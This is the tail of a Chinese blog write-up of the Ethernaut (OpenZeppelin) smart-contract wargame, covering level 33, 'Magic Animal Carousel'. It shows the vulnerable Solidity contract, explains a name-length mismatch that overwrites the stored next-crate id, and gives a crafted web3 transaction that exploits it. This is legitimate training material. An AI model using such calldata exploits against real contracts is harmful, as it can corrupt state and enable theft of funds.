class="line">    uint256 constant NEXT_ID_MASK = uint256(type(uint16).max) &lt;&lt; 160;</span><br><span class="line">    uint256 constant OWNER_MASK = uint256(type(uint160).max);</span><br><span class="line"></span><br><span class="line">    uint256 public currentCrateId;</span><br><span class="line">    mapping(uint256 crateId =&gt; uint256 animalInside) public carousel;</span><br><span class="line"></span><br><span class="line">    error AnimalNameTooLong();</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        carousel[0] ^= 1 &lt;&lt; 160;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function setAnimalAndSpin(string calldata animal) external &#123;</span><br><span class="line">        uint256 encodedAnimal = encodeAnimalName(animal) &gt;&gt; 16;</span><br><span class="line">        uint256 nextCrateId = (carousel[currentCrateId] &amp; NEXT_ID_MASK) &gt;&gt; 160;</span><br><span class="line"></span><br><span class="line">        require(encodedAnimal &lt;= uint256(type(uint80).max), AnimalNameTooLong());</span><br><span class="line">        carousel[nextCrateId] = (carousel[nextCrateId] &amp; ~NEXT_ID_MASK) ^ (encodedAnimal &lt;&lt; 160 + 16)</span><br><span class="line">            | ((nextCrateId + 1) % MAX_CAPACITY) &lt;&lt; 160 | uint160(msg.sender);</span><br><span class="line"></span><br><span class="line">        currentCrateId = nextCrateId;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function changeAnimal(string calldata animal, uint256 crateId) external &#123;</span><br><span class="line">        address owner = address(uint160(carousel[crateId] &amp; OWNER_MASK));</span><br><span class="line">        if (owner != address(0)) &#123;</span><br><span class="line">            require(msg.sender == owner);</span><br><span class="line">        &#125;</span><br><span class="line">        uint256 encodedAnimal = encodeAnimalName(animal);</span><br><span class="line">        if (encodedAnimal != 0) &#123;</span><br><span class="line">            // Replace animal</span><br><span class="line">            carousel[crateId] =</span><br><span class="line">                (encodedAnimal &lt;&lt; 160) | (carousel[crateId] &amp; NEXT_ID_MASK) | uint160(msg.sender); </span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            // If no animal specified keep same animal but clear owner slot</span><br><span class="line">            carousel[crateId]= (carousel[crateId] &amp; (ANIMAL_MASK | NEXT_ID_MASK));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function encodeAnimalName(string calldata animalName) public pure returns (uint256) &#123;</span><br><span class="line">        require(bytes(animalName).length &lt;= 12, AnimalNameTooLong());</span><br><span class="line">        return uint256(bytes32(abi.encodePacked(animalName)) &gt;&gt; 160);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fallback() external payable &#123; &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>逆天题目描述。创建动物的时候名字最多10字节，修改动物名字的时候却允许12字节。可以覆盖id的位置为0。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">web3.<span class="property">eth</span>.<span class="title function_">sendTransaction</span>(&#123;</span><br><span class="line">    <span class="keyword">from</span> : player,</span><br><span class="line">    to : contract.<span class="property">address</span>,</span><br><span class="line">    data : <span class="string">&quot;0x932289cc00000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000c3132333435363738393000000000000000000000000000000000000000000000&quot;</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
</article><div class="tag_share"><div class="post_share"></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2024/11/12/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E6%98%AF%E5%9C%9F%E8%B1%86%E5%93%A5/" title="重生之我是土豆哥"><img class="cover" src="/img/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E6%98%AF%E5%9C%9F%E8%B1%86%E5%93%A5/cover.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next</div><div class="next_info">重生之我是土豆哥</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/blogs/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Clovershrub</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">22</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#eth-openzeppelin-%E9%A2%98%E8%A7%A3"><span class="toc-text">ETH openzeppelin 题解</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E6%9C%9F%E5%87%86%E5%A4%87"><span class="toc-text">前期准备</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level0"><span class="toc-text">level0</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level1-fallback"><span class="toc-text">level1 Fallback</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level2-fallout"><span class="toc-text">level2 Fallout</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level3-coin-flip"><span class="toc-text">level3 Coin Flip</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level4-telephone"><span class="toc-text">level4 Telephone</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level5-token"><span class="toc-text">level5 Token</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level6-delegation"><span class="toc-text">level6 Delegation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level7-force"><span class="toc-text">level7 Force</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level8-vault"><span class="toc-text">level8 Vault</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level9-king"><span class="toc-text">level9 King</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level10-re-entrancy"><span class="toc-text">level10 Re-entrancy</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level11-elevator"><span class="toc-text">level11 Elevator</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level12-privacy"><span class="toc-text">level12 Privacy</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level13-gatekeeper-one"><span class="toc-text">level13 Gatekeeper One</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level14-gatekeeper-two"><span class="toc-text">level14 Gatekeeper Two</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level15-naught-coin"><span class="toc-text">level15 Naught Coin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level16-preservation"><span class="toc-text">level16 Preservation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level17-recovery"><span class="toc-text">level17 Recovery</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level18-magicnumber"><span class="toc-text">level18 MagicNumber</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level19-alien-codex"><span class="toc-text">level19 Alien Codex</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level20-denial"><span class="toc-text">level20 Denial</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level21-shop"><span class="toc-text">level21 Shop</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level22-dex"><span class="toc-text">level22 DEX</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level23-dex2"><span class="toc-text">level23 DEX2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level24-puzzle-wallet"><span class="toc-text">level24 Puzzle Wallet</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level25-motorbike"><span class="toc-text">level25 Motorbike</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level27-good-samaritan"><span class="toc-text">level27 Good Samaritan</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level28-gatekeeper-three"><span class="toc-text">level28 Gatekeeper Three</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level29-switch"><span class="toc-text">level29 Switch</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level30-higherorder"><span class="toc-text">level30 HigherOrder</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level31-stake"><span class="toc-text">level31 Stake</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level33-magic-animal-carousel"><span class="toc-text">level33 Magic Animal Carousel</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/06/19/ETH%20openzeppelin%20%E9%A2%98%E8%A7%A3/" title="ETH openzeppelin 题解"><img src="/img/ETHopenzeppelin%E9%A2%98%E8%A7%A3/cover.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ETH openzeppelin 题解"/></a><div class="content"><a class="title" href="/2025/06/19/ETH%20openzeppelin%20%E9%A2%98%E8%A7%A3/" title="ETH openzeppelin 题解">ETH openzeppelin 题解</a><time datetime="2025-06-18T16:00:00.000Z" title="Created 2025-06-19 00:00:00">2025-06-19</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/11/12/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E6%98%AF%E5%9C%9F%E8%B1%86%E5%93%A5/" title="重生之我是土豆哥"><img src="/img/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E6%98%AF%E5%9C%9F%E8%B1%86%E5%93%A5/cover.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="重生之我是土豆哥"/></a><div class="content"><a class="title" href="/2024/11/12/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E6%98%AF%E5%9C%9F%E8%B1%86%E5%93%A5/" title="重生之我是土豆哥">重生之我是土豆哥</a><time datetime="2024-11-11T16:00:00.000Z" title="Created 2024-11-12 00:00:00">2024-11-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/09/20/%5BTSCTF-J2024%5D%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E9%A2%98%E8%A7%A3/" title="[TSCTF-J2024]二进制漏洞题解"><img src="/img/%5BTSCTF-J2024%5D%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E9%A2%98%E8%A7%A3/cover.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="[TSCTF-J2024]二进制漏洞题解"/></a><div class="content"><a class="title" href="/2024/09/20/%5BTSCTF-J2024%5D%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E9%A2%98%E8%A7%A3/" title="[TSCTF-J2024]二进制漏洞题解">[TSCTF-J2024]二进制漏洞题解</a><time datetime="2024-09-19T16:00:00.000Z" title="Created 2024-09-20 00:00:00">2024-09-20</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/03/19/DubheCTF-Destination&amp;Moon/" title="DubheCTF-Destination&amp;Moon"><img src="/img/DubheCTF-Destination&amp;Moon/cover.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="DubheCTF-Destination&amp;Moon"/></a><div class="content"><a class="title" href="/2024/03/19/DubheCTF-Destination&amp;Moon/" title="DubheCTF-Destination&amp;Moon">DubheCTF-Destination&amp;Moon</a><time datetime="2024-03-18T16:00:00.000Z" title="Created 2024-03-19 00:00:00">2024-03-19</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/02/02/%E5%A4%A9%E5%A0%82%E4%B9%8B%E9%97%A8/" title="天堂之门"><img src="/img/%E5%A4%A9%E5%A0%82%E4%B9%8B%E9%97%A8/cover.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="天堂之门"/></a><div class="content"><a class="title" href="/2024/02/02/%E5%A4%A9%E5%A0%82%E4%B9%8B%E9%97%A8/" title="天堂之门">天堂之门</a><time datetime="2024-02-01T16:00:00.000Z" title="Created 2024-02-02 00:00:00">2024-02-02</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/img/blogs/foot.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2022 - 2025 By Clovershrub</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><div class="js-pjax"><script>if (!window.MathJax) {
  window.MathJax = {
    tex: {
      inlineMath: [['$', '$'], ['\\(', '\\)']],
      tags: 'ams'
    },
    chtml: {
      scale: 1.1
    },
    options: {
      renderActions: {
        findScript: [10, doc => {
          for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
            const display = !!node.type.match(/; *mode=display/)
            const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
            const text = document.createTextNode('')
            node.parentNode.replaceChild(text, node)
            math.start = {node: text, delim: '', n: 0}
            math.end = {node: text, delim: '', n: 0}
            doc.math.push(math)
          }
        }, '']
      }
    }
  }
  
  const script = document.createElement('script')
  script.src = 'https://cdn.jsdelivr.net/npm/mathjax/es5/tex-mml-chtml.min.js'
  script.id = 'MathJax-script'
  script.async = true
  document.head.appendChild(script)
} else {
  MathJax.startup.document.state(0)
  MathJax.texReset()
  MathJax.typesetPromise()
}</script></div><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-fluttering-ribbon.min.js"></script><script id="canvas_nest" defer="defer" color="255,0,150" opacity="0.7" zIndex="-1" count="200" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = false;
POWERMODE.mobile = false;
document.body.addEventListener('input', POWERMODE);
</script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-heart.min.js" async="async" mobile="true"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>